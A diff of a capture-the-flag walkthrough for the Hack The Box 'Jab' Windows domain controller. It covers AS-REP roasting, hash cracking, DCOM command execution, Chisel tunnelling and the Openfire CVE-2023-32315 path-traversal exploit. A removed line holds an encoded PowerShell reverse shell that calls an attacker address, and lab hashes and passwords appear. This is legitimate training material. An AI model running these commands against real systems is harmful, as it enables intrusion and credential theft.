@@ -15,7 +15,7 @@ Rustscan discovers many ports open. Based on the ports open, target seems to be 
 
 `rustscan --addresses 10.10.11.4 --range 1-65535`
 
-![alt text](image-43.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-43.png)
 
 ### Nmap
 
@@ -314,25 +314,29 @@ Nmap done: 1 IP address (1 host up) scanned in 247.50 seconds
 ## Enumeration
 ### SMB - TCP 445
 
-Let's add **jab.htb** and **dc01.jab.htb** to `/etc/hosts`:
+Since this is a DC machine, let's start with enumerating SMB:
 
 `crackmapexec smb 10.10.11.4`
 
-![alt text](image.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image.png)
 
+Let's add **jab.htb** and **dc01.jab.htb** to `/etc/hosts`:
 ### DNS - TCP 53
 
-Zone transfer fails:
+Next, let's move on to enumerating DNS:
 
 `dig axfr @10.10.11.4 jab.htb`
 
-![alt text](image-1.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-1.png)
 
+Unfortunately zone transfer fails.
 ### HTTPs - TCP 7443
 
 There's Openfire HTTP Binding Service running on port 7443:
 
-![alt text](image-2.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-2.png)
+
+**What is Openfire?**
 
 **Openfire** is a real-time collaboration server that uses the **XMPP** protocol. It is written in Java and can support thousands of concurrent users. Openfire includes several key features, such as:
 
@@ -349,29 +353,29 @@ In order to interact with **XMPP**, let's install [Spark](https://igniterealtime
 
 After starting Spark, go to **Advanced** and set the host as our target machine and set port as 5222:
 
-![alt text](image-18.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-18.png)
 
 Encryption mode should be disabled as well:
 
-![alt text](image-5.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-5.png)
 
 Now let's create a new account:
 
-![alt text](image-3.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-3.png)
 
-Using the new account, now we can login to the XMPP server:
+Using the new account, we can login to the XMPP server:
 
-![alt text](image-7.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-7.png)
 
 ### XMPP Enumeration
 
-Going to **Actions** -> **Join conference room**, we see two rooms: test and test2
+Going to **Actions** -> **Join conference room**, we see two rooms: **test** and **test2**
 
-![alt text](image-8.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-8.png)
 
 **test** is encrypted and **test2** is accessible:
 
-![alt text](image-9.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-9.png)
 
 We see a message from **bdavis**, which seems to be encrpyted with base64:
 
@@ -379,19 +383,19 @@ We see a message from **bdavis**, which seems to be encrpyted with base64:
 
 We can decrypt it using **base64**, but nothing useful is seen:
 
-![alt text](image-10.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-10.png)
 
 Going to **Conferences**, new subdomain **conference.jab.htb** is discovered:
 
-![alt text](image-11.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-11.png)
 
 **Search** provides user search service:
 
-![alt text](image-12.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-12.png)
 
 Using this feature, we can obtain list of potential users on domain:
 
-![alt text](image-13.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-13.png)
 
 Using this usernames, we can perform AS-REP Roasting attack. However, it is not possible copy-paste or export this list of users. 
 
@@ -400,136 +404,193 @@ We would have to find a way around it.
 
 ### User List Retrieval
 
+So our plan here is to listen on Spark's user search function and sort out list of usernames.
 
+Let's first start a **tcpdump** listener on our HTB VPN network:
 
-![alt text](image-14.png)
+`sudo tcmpdump -i tun0 -w output1.pcap`
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-14.png)
+
+Now let's sort out the username as such:
 
 `sudo cat output1.pcap | grep -a -oP '(?<=<field var="Username"><value>)[^<]+'`
 
-![alt text](image-15.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-15.png)
+
+We now have set of usernames ready for AS-REP Roasting attack. 
 
 ## AS-REP Roast
 
+With the list of usernames, let's perform AS-REP Roasting:
+
 `sudo GetNPUsers.py 'jab.htb/' -user user.list -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.11.4`
 
-![alt text](image-16.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-16.png)
 
-![alt text](image-4.png)
+After waiting a while for the scan to complete, we can see that users **jmontgomery**, **lbradford**, and **mlowe** has **UF_DONT_REQUIRE_PREAUTH** set:
 
-```bash
-$krb5asrep$23$jmontgomery@JAB.HTB:da2205f1dded73591358d7738a5d0c28$e308c1760b633716ad287062db0c81f507dc120c8a7549b768262f1ed07530fa5d98366782097256782afec7824afa4379053cfc63dacb87759d8f6b8f6bf2b5ec607c7598ccc51a836e44a297e8ef7ea533588171eb347aff84a3f3d138c28e283f1481aabe0d47f0a87d62164859938286d04c5d4254bf6a381106154dfed2c8a7a0631d0f3a7efb2fbcfce30a2042e8b8932d3c88eeeb579fb6442e7707b66001c42bb0d1203547e53aa7e1b8dd4f44f81a409e305b4abe5f99d356251de01c09d0ed2a604410bb5e977d9e04b7a12670b3f2e03666ff2a28bde6ce4041f9b462
-$krb5asrep$23$lbradford@JAB.HTB:2bd1bf739a23d77c1433436cd41f54e7$8fa36235a2a1e48c819f396ac5e4dab0c7c39484ca7de067707d45222060eb410f240f5617f8ebeaacb50f2ae3db30dc3ad6e7c95fd8e95351b9e2e3a9ecb87dc9cc97505f7050f99fcec50b624dca85ea019aea39f8d823d799f4f2ae87815c8a988cdc892612e0ab0cf8ff41abcbc04d1afb4a1208c6efaeeb7a3e697ea986b19903a28b0d0d8297f48749c444d69733b24d24f3022620082d378a8583050caebad25db1e3c7674d3c2caad808a6f30deadefb72a3fef71367be0df25bf2f0c24d6b9d9db3ba1fcfb58157927a67ca11df9cbad2d68be86c840e077cb8cf15ab5d
-$krb5asrep$23$mlowe@JAB.HTB:0a214ad8a2a5cbc226424654ba4c5904$812cca7335da954fc8fbea11548e6fcdeac1ba395211036a33be117f024202d169416d85aa7082f9e33d13f30bb14cfe5ea40a203b00e6e55d11d4c318cfb388b58847530e13a4183116dffffc46a1dbec474f59f3719860d219e9b62b8a6e6a1dd49f81f10a1afbd05b9f4d3f4418954a8276a2d416daec4484e3854c9d2da0a9d048f8c1668d5611af548a9d31a7866d49a87bde25a5b3683e8c325647731f3357698dd083c516f4ce70991435f8b7f3ae2416ee98f22ae33aac1def580f4d6553b1e990e6f7e994c347dcbf3391836b64550069c4e664d8a2524a9512011ffd82
-```
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-4.png)
 
+Now let's move on to cracking these hashes.
 ### Hash Crack
+
+Let's use hashcat mode 18200 for cracking above hashes.
 
 `hascat -m 18200 hashes rockyou.txt`
 
-pic here
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/jab1.png)
 
-Midnight_121
+Only hash for **jmontgomery** is cracked and the password is: **Midnight_121**
 
 ## Shell as svc_openfire
 ### XMPP as jmontgomery
 
-![alt text](image-6.png)
+Now that we have obtained credentials for **jmontgomery**, let's sign-in to XMPP as **jmontgomery** and see what it in there:
 
-![alt text](image-19.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-6.png)
 
-![alt text](image-20.png)
+Looking at open chat rooms, we see one more interesting room: **2003 Third Party Pentest Discussion**:
 
-![alt text](image-21.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-19.png)
 
-![alt text](image-22.png)
+Let's take a look into it. 
 
-`!@#$%^&*(1qazxsw`
+It seems like **adunn** and **bdavis** is talking about misconfiguration they discovered during a pentest regarding **svc_openfire** account:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-20.png)
+
+Scrolling down a little more, password hash for **svc_openfire** is found:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-21.png)
+
+Even without the need for us to crack it, they provided cracked password in plain text:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-22.png)
+
+Password for **svc_openfire** should be `!@#$%^&*(1qazxsw`.
 
 ### Bloodhound
 
+Now let's enumerate the AD environment using Bloodhound and user **svc_openfire**'s credentials:
+
 `sudo bloodhound-python -u 'svc_openfire' -p '!@#$%^&*(1qazxsw' -d jab.htb -dc DC01.jab.htb -c all -ns 10.10.11.4 --dns-timeout 30`
 
-![alt text](image-23.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-23.png)
 
-![alt text](image-24.png)
+After spinning up **neo4j console** and **bloodhound**, we first mark **svc_openfire** as owned:
 
-![alt text](image-25.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-24.png)
 
-![alt text](image-26.png)
+Poking around Bloodhound, we see that there's **ExecuteDCOM** right from **svc_openfire** to **DC01.jab.htb**:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-25.png)
+
+This will allow us to run commands on the Domain Controller:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-26.png)
+
+Using this, we will be able to spawn reverse shell as the uer **svc_openfire**.
 
 ### ExecuteDCOM
 
-![alt text](image-27.png)
-
-`dcomexec.py -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA5ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -silentcommand`
+Before exploiting **ExecuteDCOM**, let's first prepare reverse shell payload using [revshell](www.revshells.com):
 
 
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-27.png)
 
-![alt text](image-28.png)
+Now using **dcomexec.py**, we should be able to spawn a reverse shell on our netcat listener:
 
+`dcomexec.py -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'reverse_shell_command' -silentcommand`
+
+After running the command, we have reverse shell connection on our netcat listener as **svc_openfire**:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-28.png)
+
+It is now time for us to move on to privilege escalation.
 ## Privesc: svc_openfire to system
+
+Let's first see if there's any interesting ports open internally:
 
 `netstat -ano | findstr '127.0.0.1'`
 
-![alt text](image-29.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-29.png)
+
+We can see that port **9090** and **9091** is open internally and we don't usually see this. 
+
+Let's see if it is running a website on it:
 
 `Invoke-WebRequest -Uri http://127.0.0.1:9090/ -UseBasicParsing`
 
-![alt text](image-30.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-30.png)
+
+It seems like port 9090 is running a website on it. 
+
+Let's tunnel it to our local Kali machine to take a look at it. 
 
 ### Chisel
 
+Let's move **Chisel** executable to the target machine.
+
+First, we start smbserver:
+
 `impacket-smbserver share -smb2support $(pwd)`
 
-![alt text](image-31.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-31.png)
+
+Now on the target machine, we can download chisel executable:
 
 `copy \\10.10.14.29\share\chisel_windows.exe`
 
-![alt text](image-33.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-33.png)
+
+Let's prepare Chisel server on our Kali machine and start Chisel client sessions from the target machine, tunneling both port **9090** and **9091**:
 
 `.\chisel_windows.exe client 10.10.14.29:9999 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091`
 
+We can see that tunneling session is made on Chisel server side:
 
 `chisel server -p 9999 --reverse`
 
-![alt text](image-32.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-32.png)
+
+We should be able to access the website from our local browser now.
 
 ### CVE-2023-32315
 
-`http://127.0.0.1:9090`
+Let's access the website by going to `http://127.0.0.1:9090` on web browser:
 
-![alt text](image-34.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-34.png)
 
-![alt text](image-35.png)
+The website is running **Openfire 4.7.5** and we can login using the credentials for **svc_openfire**:
 
-![alt text](image-36.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-35.png)
 
-https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce
+Searching for the known exploit regarding the version, it seems like it is vulnerable to **CVE-2023-32315**:
 
-https://learningsomecti.medium.com/path-traversal-to-rce-openfire-cve-2023-32315-6a8bf0285fcc
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-36.png)
+
+By visiting the address below, we can test if the corresponding Webapp is actually vulnerable:
 
 `http://127.0.0.1:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp`
-c
-![alt text](image-37.png)
 
-`http://127.0.0.1:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/plugin-admin.jsp`
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-37.png)
 
-![alt text](image-38.png)
+Following [this tutorial](https://github.com/miko550/CVE-2023-32315), we should be able to get a shell as the system. 
 
-![alt text](image-39.png)
+Let's first move to **Plugins** tab:
 
-r5T22vwBUaJv1aW
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-40.png)
 
-https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass
+At the bottom of the page, we can see that we can upload our own plugins.
 
+Let's upload **Management Tool** plugin:
 
-https://github.com/miko550/CVE-2023-32315
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-41.png)
 
-![alt text](image-40.png)
+After successfully uploading, by going to **Server** >** server settings** > **Management tool**, we get execute commands as the system:
 
-![alt text](image-41.png)
-
-![alt text](image-42.png)
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/jab/image-42.png)
 
 
 ## References
